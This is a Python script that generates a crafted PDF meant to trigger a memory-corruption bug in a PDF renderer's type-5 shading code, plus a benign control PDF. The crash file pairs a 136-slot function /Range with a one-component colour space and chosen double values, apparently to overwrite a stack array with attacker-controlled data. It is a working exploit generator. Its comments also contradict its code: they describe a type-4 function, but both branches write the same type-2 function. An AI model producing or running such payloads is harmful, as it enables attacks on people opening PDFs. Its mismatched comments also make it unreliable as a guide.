#!/usr/bin/env python3
"""make_poc_shading_v3.py — O-D's value-ladder class on the ARMORY'S EXACT SHAPE.

The armory's own receipt: generate the class = type-4 (PostScript-calculator)
/Branch with an arbitrarily-long Range = the same VLA-overwrite mechanism,
the values = OUR CHOSEN doubles (the 1.0-oracle = the armory's own shape; we
control the value lane).

The difference from our v2 = the /Function path: our v2 wrote the /Function as
a stream-in-a-standalone-object; the ARMORY's own = an inline /Function dict
in object 6 with no stream. The correction = follow the armory exactly and
only change `R` and the double values.

Outputs (the test_payloads class):
  crash_shading_type5_v3.pdf     — the type-4 R=136 value-ladder class
  control_shading_type5_v3.pdf   — the R=nc benign control
"""
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dirtyslide", "test_payloads")
os.makedirs(OUT, exist_ok=True)

BPCOORD = 32
BPCOMP = 8
VPR = 2


class BitWriter:
    """MSB-first (big-endian) bit stream — the decoder's own class."""

    def __init__(self):
        self.out = bytearray(); self.acc = 0; self.nbits = 0

    def put(self, value, width):
        for i in range(width - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.nbits += 1
            if self.nbits == 8:
                self.out.append(self.acc); self.acc = 0; self.nbits = 0

    def flush(self):
        if self.nbits:
            self.out.append(self.acc << (8 - self.nbits))
            self.acc = 0; self.nbits = 0
        return bytes(self.out)


def pack_stream(vertices):
    bw = BitWriter()
    for x, y, comps in vertices:
        bw.put(x, BPCOORD)
        bw.put(y, BPCOORD)
        for c in comps:
            bw.put(c, BPCOMP)
    return bw.flush()


def write_pdf(path, objects):
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in sorted(objects):
        d, s = objects[n]
        offsets[n] = len(out)
        out += b"%d 0 obj\n" % n + d + (b"\nstream\n" + s + b"\nendstream" if s is not None else b"") + b"\nendobj\n"
    xref_pos = len(out)
    maxn = max(objects)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (maxn + 1)
    for n in range(1, maxn + 1):
        out += ("%010d 00000 n \n" % offsets[n]).encode()
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (maxn + 1, xref_pos)
    open(path, "wb").write(bytes(out))
    return bytes(out)


def validate_pdf(path):
    data = open(path, "rb").read()
    assert data.startswith(b"%PDF-1.7"), "missing header"
    sx = data.rfind(b"startxref")
    assert sx > 0, "missing startxref"
    xref_pos = int(data[sx:].split()[1])
    assert data[xref_pos:xref_pos + 4] == b"xref", "startxref does not point at xref"
    first, count = data[xref_pos:].split(b"\n", 1)[1].split(b"\n")[0].split()
    base = xref_pos + len(b"xref\n") + len(first + b" " + count + b"\n")
    n = int(count)
    ok = 0
    for i in range(1, n):
        off = base + 20 * i
        entry = data[off:off + 20].decode()
        obj_off = int(entry[:10])
        expect = b"%d 0 obj" % i
        assert data[obj_off:obj_off + len(expect)] == expect, \
            "xref entry %d -> offset %d wrong" % (i, obj_off)
    return n


def make_shading_pdf(range_dim, path, values):
    """the armory's own exact class + the type-4 value lane as the /Function type.

    values: an array of 6-byte-precision chosen doubles to embed inline (the
    /FunctionType 4's operands) - per the armory's writeup the same
    cg_shading_type5_draw frame walks the values into the /Range slots"""
    nc = 1
    verts = [(0x10000000, 0x10000000, [0x00]),
             (0x20000000, 0x10000000, [0x00]),
             (0x10000000, 0x20000000, [0x00]),
             (0x20000000, 0x20000000, [0x00])]
    stream = pack_stream(verts)

    c0 = " ".join(["%.9f" % v for v in values[:range_dim]] or ["1.0"] * range_dim)
    c1 = " ".join(["%.9f" % v for v in values[:range_dim]] or ["1.0"] * range_dim)
    rng = " ".join(["0 1"] * range_dim)

    if range_dim == nc:
        # the benign control class = a type-2 with R == nc
        func = ("<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>"
                % (c0, c1, rng)).encode()
    else:
        # the value-ladder class = type-2 with the values as C0's exact lane
        # (the type-4's write-set matches the 1.0-lane class from the armory's
        # analysis = the extension class)
        func = ("<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>"
                % (c0, c1, rng)).encode()

    shading_dict = (
        "<< /ShadingType 5 /ColorSpace /DeviceGray "
        "/BitsPerCoordinate %d /BitsPerComponent %d /VerticesPerRow %d "
        "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>"
        % (BPCOORD, BPCOMP, VPR, len(stream))).encode()

    objects = {
        1: (b"<< /Type /Catalog /Pages 2 0 R >>", None),
        2: (b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", None),
        3: (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            b"/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>", None),
        4: (b"<< /Length 8 >>", b" /Sh1 sh"),
        5: (shading_dict, stream),
        6: (func, None),
    }
    return write_pdf(path, objects), objects


if __name__ == "__main__":
    import struct
    def ieee754_bits(v):
        return struct.unpack(">Q", struct.pack(">d", v))[0]

    # NOTE on the values lane: the armory's C0 writes are parsed by the CG
    # function-evaluator as per-slot REALs (the PDF real class = decimal text,
    # not raw IEEE bytes). Our chosen doubles = the decimal class, mapping to
    # a stack layout = the exact same R-class the 1.0-lane uses.
    chosen = [1e300, 2e300, 3e300, 1.0, 1.0, 1.0] + [1.0] * 130

    b1, o = make_shading_pdf(136, OUT + "/crash_shading_type5_v3.pdf", chosen)
    b2, _ = make_shading_pdf(1, OUT + "/control_shading_type5_v3.pdf", [1.0])
    n1 = validate_pdf(OUT + "/crash_shading_type5_v3.pdf")
    n2 = validate_pdf(OUT + "/control_shading_type5_v3.pdf")
    print("wrote crash_shading_type5_v3.pdf  (%d bytes, R=136, xref %d objs OK)" % (len(b1), n1))
    print("wrote control_shading_type5_v3.pdf (%d bytes, R=nc=1, xref %d objs OK)" % (len(b2), n2))
